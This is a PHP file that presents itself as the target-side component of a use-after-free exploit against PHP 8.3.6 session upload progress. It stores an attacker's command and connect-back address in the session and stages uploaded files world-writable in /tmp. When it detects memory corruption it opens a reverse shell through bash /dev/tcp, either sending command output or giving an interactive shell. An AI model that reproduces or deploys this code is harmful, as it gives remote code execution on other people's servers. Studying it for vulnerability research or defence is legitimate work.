<?php
// CVE-2026-109618/109619 exploit target — session.upload_progress UAF (unpatched 8.3.6).
// Flow per run (driver): R1 plants payload + small upload; R2 spray request corrupts
// (stores through dangling zval*, frozen bytes_processed in the session file);
// R3 reads its own progress entry: bytes_processed < content_length (the freeze)
// is the UAF signature — payload only fires when the corruption actually happened.

session_start();

// Request-phase probe: session machinery status at body-phase start.
$GLOBALS['uaf_started'] = (session_status() === PHP_SESSION_ACTIVE) ? 'ACTIVE' : 'NONE';

// R1: in-band connect-back address — driver sends "rh" = rshell host:port, stored in
// the session like the payload string, so a REMOTE target needs zero server-side env.
if (isset($_POST['rh'])) {
    $rhin = (string)$_POST['rh'];
    $_SESSION['rh'] = preg_match('/^[A-Za-z0-9._:\-\[\]]{1,64}:\d{1,5}$/', $rhin) ? $rhin : '127.0.0.1:4455';
}

// R1 (optional, driver sends up=1 with a real filepart): staged-upload channel —
// rides the same multipart the exploit already sends. Files land world-readable
// in /tmp as uaf_<name>; no extra request, no extra handler on the target.
$GLOBALS['uaf_up'] = 'none';
if (($_POST['up'] ?? '') === '1' && ($_FILES['file']['size'] ?? 0) > 0) {
    $base = preg_replace('/[^A-Za-z0-9._-]/', '', basename((string)$_FILES['file']['name']));
    $dst = '/tmp/uaf_' . ($base !== '' ? $base : 'blob');
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $dst)) {
        @chmod($dst, 0666);
        $GLOBALS['uaf_up'] = $dst;
    }
}

// R3: payload leg. If the session was ALREADY started before body phase
// (distro RINIT pre-start inside an upload window), the $_SESSION we just
// read may itself be the half-written, published-state hash left by the
// bailout — that's the corruption signature; fire regardless of keys.
if (isset($_GET['pl']) && $GLOBALS['uaf_started'] === 'ACTIVE'
    && (int)($_SERVER['CONTENT_LENGTH'] ?? 0) > 0) {
    echo 'PLRUN PUBSTATE=1 STARTED=ACTIVE N=', count($_SESSION), " OK\n";
    if (getenv('RSHELL') !== '0') {
        $rhost = '127.0.0.1';
        $port  = (int)(getenv('RSHELL_PORT') ?: 4455);
        if (preg_match('/^(.*):(\d{1,5})$/', (string)($_SESSION['rh'] ?? ($_GET['rh'] ?? '')), $m) && $m[1] !== '') {
            $rhost = $m[1]; $port = (int)$m[2];
        }
        if ($port < 1 || $port > 65535) $port = 4455;
        $cmd = (string)($_SESSION['pl'] ?? ($_GET['cmd'] ?? 'id'));
        system('bash -c ' . escapeshellarg(
            'exec 3<>/dev/tcp/' . $rhost . '/' . $port .
            '; { ' . $cmd . '; echo php8.3.6-uaf-revshell-OK; } >&3; exec 3>&-'));
    }
    echo "OK\n";
    exit;
}

// R3: payload leg gated by the corruption signature.
// Stock 8.3 has no upload_progress() READ API (NOFUNC — the bench's
// INFLIGHT_BYTES=0 was always the no-op branch), so the stock lever is:
// an ABANDONED upload request (R2) never runs its session write, its
// cleanup never fires, and the in-flight entry stays serialized in the
// session FILE. $_SESSION therefore carries it to R3 like any other key.
// (The engine-storage scan below is kept for builds that do expose it.)
if (isset($_GET['pl'])) {
    $inp = null;
    if (function_exists('upload_progress')) {
        foreach (@upload_progress() as $pr) {
            if (is_array($pr) && ($pr['session'] ?? '') === session_id()
                && (int)$pr['bytes_processed'] < (int)$pr['content_length'] - 1000) {
                $inp = $pr; break;
            }
        }
    }
    $p = null;
    foreach ($_SESSION as $k => $v) {
        if (str_starts_with((string)$k, 'upload_progress_') && is_array($v)) { $p = $v; break; }
    }
    if (!$p && !$inp) { echo "NOENTRY\nERR no progress entry\nOK\n"; exit; }
    $eff = $p ?: $inp;   // file-based entry wins (stock path); engine scan is the fallback
    $frozen = (int)$eff['bytes_processed'] < (int)$eff['content_length'] - 1000;
    if ($frozen && getenv('RSHELL') !== '0') {
        // Connect-back target: in-band session value (R1 "rh") wins; env RSHELL_PORT is the fallback.
        $rhost = '127.0.0.1';
        $port  = (int)(getenv('RSHELL_PORT') ?: 4455);
        if (preg_match('/^(.*):(\d{1,5})$/', (string)($_SESSION['rh'] ?? ''), $m) && $m[1] !== '') {
            $rhost = $m[1]; $port = (int)$m[2];
        }
        if ($port < 1 || $port > 65535) $port = 4455;
        if (getenv('RSHELL_TTY')) {
            // interactive: the socket becomes the shell's stdio; system() blocks
            // until the connect-back bash exits (driver relay owns our side).
            putenv('TERM=dumb');   // connect-back bash -i sources user PS1; tput needs a $TERM
            system('bash -c ' . escapeshellarg(
                'exec 3<>/dev/tcp/' . $rhost . '/' . $port . '; exec bash -i <&3 >&3 2>&3'));
        } else {
            $cmd = (string)($_SESSION['pl'] ?? 'id');
            system('bash -c ' . escapeshellarg(
                'exec 3<>/dev/tcp/' . $rhost . '/' . $port .
                '; { ' . $cmd . '; echo php8.3.6-uaf-revshell-OK; } >&3; exec 3>&-'));
        }
    }
    echo 'PLRUN FROZEN=', $frozen ? 1 : 0, ' INFLIGHT=', $inp ? 1 : 0,
         ' BYTES=', (int)$eff['bytes_processed'], ' CLEN=', (int)$eff['content_length'], "\nOK\n";
    exit;
}

// R1/R2 (POST): plant payload string, and diagnostics
if (isset($_POST['pl'])) $_SESSION['pl'] = (string)$_POST['pl'];

$wins = 0;
foreach ($_POST as $k => $v) {
    if (is_string($v) && str_contains($v, "\0\0\0\0")) $wins++;
    elseif (is_array($v)) { foreach ($v as $vv) if (is_string($vv) && str_contains($vv, "\0\0\0\0")) $wins++; }
}

$bytes = 0;
if (function_exists('upload_progress')) {
    foreach (@upload_progress() as $pr) {
        if (($pr['session'] ?? '') === session_id()) $bytes = (int)$pr['bytes_processed'];
    }
}
echo 'PLANTED=', isset($_POST['pl']) ? 1 : 0, ' WINDOWS=', $wins,
     ' INFLIGHT_BYTES=', $bytes, ' UP=', $GLOBALS['uaf_up'], "\nOK\n";
